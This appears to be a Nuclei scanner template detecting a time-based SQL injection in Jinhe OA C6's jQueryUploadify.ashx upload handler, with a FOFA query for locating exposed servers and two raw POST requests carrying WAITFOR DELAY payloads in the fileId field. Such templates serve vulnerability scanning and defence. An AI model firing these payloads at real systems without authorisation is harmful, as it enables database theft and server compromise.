id: jinheOA-C6-jQueryUploadify_ashx-sql

info:
  tags: jinheOA-C6-jQueryUploadify_ashx-sql
  name: 金和OA C6 jQueryUploadify.ashx SQL延时注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
    金和OA C6 jQueryUploadify.ashx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。


http:
  - raw:
      - |
        POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: application/x-www-form-urlencoded

        type=delete&fileId=-99';WAITFOR+DELAY'0:0:4'--
      - |
        POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: application/x-www-form-urlencoded

        type=delete&fileId=-99';WAITFOR+DELAY'0:0:8'--
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



